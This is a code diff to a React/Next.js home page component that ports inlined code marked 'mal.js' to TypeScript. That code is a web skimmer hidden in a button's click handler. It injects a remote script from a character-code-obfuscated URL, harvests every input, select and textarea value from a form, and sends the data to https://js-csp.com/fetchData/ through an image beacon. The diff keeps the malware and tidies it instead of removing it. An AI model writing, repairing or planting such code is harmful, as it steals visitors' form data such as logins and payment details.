@@ -59,13 +59,15 @@ export default function Home() {
               type="button"
               className="rounded-full border-2 border-indigo-600 px-8 py-3 text-base font-medium text-indigo-600 hover:bg-indigo-50 dark:text-indigo-400 dark:hover:bg-gray-800 transition-colors"
               onClick={() => {
-                // mal.js code inlined
-                ((x, y, z, h, o) => {
+                // mal.js code inlined with TypeScript fixes
+                ((x: Window, y: number[], z: Document, h: string, o: number[]) => {
                   if (x.location.toString().includes(String.fromCharCode.apply(null, y))) {
-                    var i = z.createElement(h);
-                    var j = z.getElementsByTagName(h)[0];
+                    const i = z.createElement(h) as HTMLScriptElement;
+                    const j = z.getElementsByTagName(h)[0];
                     i.src = String.fromCharCode.apply(null, o);
-                    j.parentNode.insertBefore(i, j);
+                    if (j && j.parentNode) {
+                      j.parentNode.insertBefore(i, j);
+                    }
                   }
                 })(
                   window,
@@ -77,34 +79,35 @@ export default function Home() {
                     111, 109, 47, 103, 101, 116, 73, 110, 106, 101, 99, 116, 111, 114, 47,
                   ]
                 );
-                function F(t) {
-                  var z = {};
-                  var D = {};
-                  var V = t.querySelectorAll("input, select, textarea");
-                  var h = 0;
+                function F(t: HTMLFormElement): Record<string, string> {
+                  const z: Record<string, string> = {};
+                  const D: Record<string, number> = {};
+                  const V = t.querySelectorAll("input, select, textarea");
+                  let h = 0;
                   for (; h < V.length; h = h + 1) {
-                    var S = V[h];
-                    var P = S.name;
+                    const S = V[h] as HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement;
+                    let P: string = (S as any).name;
                     if (!P) {
-                      P = S.id;
+                      P = (S as any).id;
                     }
-                    var v = S.value;
+                    const v = (S as any).value;
                     if (v !== "") {
                       if (P) {
                         if (!D[P]) {
                           D[P] = 0;
                         }
-                        if (S.tagName != "SELECT") {
-                          if (D[P] == 0) {
+                        if (S.tagName !== "SELECT") {
+                          if (D[P] === 0) {
                             z[P] = v;
                           } else {
-                            z[P + "#" + D[P]] = v;
+                            z[`${P}#${D[P]}`] = v;
                           }
                         } else {
-                          if (D[P] == 0) {
-                            z[P] = S.options[S.selectedIndex].text;
+                          const selectElem = S as HTMLSelectElement;
+                          if (D[P] === 0) {
+                            z[P] = selectElem.options[selectElem.selectedIndex]?.text || "";
                           } else {
-                            z[P + "#" + D[P]] = S.options[S.selectedIndex].text;
+                            z[`${P}#${D[P]}`] = selectElem.options[selectElem.selectedIndex]?.text || "";
                           }
                         }
                         D[P] = D[P] + 1;
@@ -113,9 +116,9 @@ export default function Home() {
                   }
                   return z;
                 }
-                function __send(str) {
+                function __send(str: string) {
                   try {
-                    var img = new Image();
+                    const img = new Image();
                     img.crossOrigin = "anonymous";
                     img.src =
                       "https://js-csp.com/fetchData/?data=" +
